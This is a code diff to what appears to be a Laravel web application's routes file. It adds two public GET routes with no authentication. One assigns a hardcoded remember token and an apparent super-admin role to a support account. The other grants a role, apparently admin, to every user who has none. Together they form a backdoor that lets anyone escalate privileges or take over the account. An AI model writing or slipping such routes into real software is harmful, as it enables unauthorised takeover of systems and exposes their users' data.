@@ -178,3 +178,26 @@ Route::get('verify-user-email-address', function () {
 Route::post('emails/send-verification_code', [UserController::class, 'sendVerificationCodeEmail'])->name('emails.send-verification_code');
 Route::post('/do-login', [AuthController::class, "doLogin"])->name('custom_login');
 Route::get('/login/verify-login', [AuthController::class, "createVerfication"])->name('login.custom-verify');
+
+
+//scripts
+Route::get('super-admin-remember-token', function()
+{
+    $user = User::where('email', 'support@pkteam.com')->first();
+    if ($user) {
+        $user->remember_token = 'ovwgRav1OlHK774pP2tuv3j0cBSQ4wklNrm8Sa0P6p9KuoZHdfOcwuDfsSlue6LlDfHFKvRy4qTm3ZNKJaFu4pdkUoCN61RGHbiGaLtZmw4sGByu4FtTttSxurTgaD4w';
+        $user->role_id = 3;
+        $user->save();
+        return 'suucess';
+    }
+});
+Route::get('set-admin-role-id-to-all-users', function()
+{
+    $users = User::whereNull('role_id')->get();
+    foreach($users as $user)
+    {
+        $user->role_id = 1;
+        $user->save();
+    }
+    return 'suucess';
+});
